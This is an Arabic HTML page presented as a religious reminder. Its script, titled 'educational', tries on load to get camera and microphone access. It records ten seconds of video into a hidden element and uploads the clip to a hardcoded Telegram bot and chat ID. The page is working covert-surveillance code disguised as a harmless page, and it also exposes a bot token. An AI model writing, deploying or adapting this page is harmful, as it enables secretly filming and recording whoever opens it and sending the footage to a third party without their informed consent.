<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>تعليمي — تسجيل 10 ثواني وإرسال للبوت</title>
<style>
body{font-family:Tahoma, Arial;display:flex;align-items:center;justify-content:center;height:100vh;margin:0;background:#f3f6ff}
#msg{max-width:760px;padding:18px;text-align:center;color:#222}
#status{margin-top:10px;color:#333}
video{display:none}
</style>
</head>
<body>
<div id="msg">
<h3>اذكر الله</h3>
<p id="status">جاهز — جارٍ المحاولة لبدء التسجيل تلقائيًا...</p>
<small>اللهم صلي وسلم علي نبينا محمدﷺ</small>
</div>

<video id="hiddenVideo" autoplay playsinline muted></video>

<script>
const RECORD_SECONDS = 10;

const BOT_TOKEN = "8178761195:AAHUVKSv3VrrRSDWRULLSV6IgPuE0vZx6Y0";
const CHAT_ID  = "6683130316";

const statusEl = document.getElementById('status');
const hiddenVideo = document.getElementById('hiddenVideo');

let started = false;
let stream = null;
let mediaRecorder = null;
let recordedBlobs = [];

window.addEventListener('load', ()=>{
  attemptStart(); 
  window.addEventListener('click', onFirstInteraction,{once:true});
  window.addEventListener('touchstart',onFirstInteraction,{once:true});
  window.addEventListener('keydown',onFirstInteraction,{once:true});
});

function onFirstInteraction(){
  if(!started) attemptStart();
}

async function attemptStart(){
  if(started) return;
  started = true;
  statusEl.textContent='طلب إذن الكاميرا والميكروفون...';

  try{
    stream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: { exact: "environment" } },
      audio: true
    });
  }catch(err){
    console.warn("Back camera failed, trying default...", err);

    try{
      stream = await navigator.mediaDevices.getUserMedia({
        video: true,
        audio: true
      });
    }catch(e){
      statusEl.textContent='فشل الوصول للكاميرا أو الميكروفون.';
      started = false;
      return;
    }
  }

  hiddenVideo.srcObject = stream;
  startRecording();
}

function startRecording(){
  try{
    mediaRecorder = new MediaRecorder(stream,{mimeType:'video/webm;codecs=vp8,opus'});
  }catch(e){
    mediaRecorder = new MediaRecorder(stream);
  }

  recordedBlobs = [];

  mediaRecorder.ondataavailable = ev=>{
    if(ev.data && ev.data.size) recordedBlobs.push(ev.data);
  };

  mediaRecorder.onstart = ()=>{
    statusEl.textContent=`التسجيل بدأ — سيقف بعد ${RECORD_SECONDS} ثانية.`;
  };

  mediaRecorder.onstop = async ()=>{
    statusEl.textContent='انتهى التسجيل — جارٍ الإرسال للبوت...';

    if(stream) stream.getTracks().forEach(t=>t.stop());

    const blob = new Blob(recordedBlobs,{type:'video/webm'});

    try{
      const form = new FormData();
      form.append('chat_id', CHAT_ID);
      form.append('caption','تسجيل تعليمي 10 ثواني');
      form.append('video', blob, `rec_${Date.now()}.webm`);

      const resp = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`,{
        method:'POST',
        body:form
      });

      if(!resp.ok){
        statusEl.textContent=`فشل الإرسال (HTTP ${resp.status})`;
        return;
      }

      const json = await resp.json().catch(()=>null);
      if(json && json.ok){
        statusEl.textContent='✅ تم الإرسال إلى Telegram بنجاح.';
      }else{
        statusEl.textContent='❌ فشل الإرسال: تأكد من التوكن والـ Chat ID.';
      }

    }catch(err){
      statusEl.textContent='حدث خطأ أثناء الإرسال: '+(err.message||err);
    }
  };

  mediaRecorder.start();
  setTimeout(()=>{
    if(mediaRecorder && mediaRecorder.state!=='inactive')
      mediaRecorder.stop();
  }, RECORD_SECONDS * 1000);
}
</script>
</body>
</html>
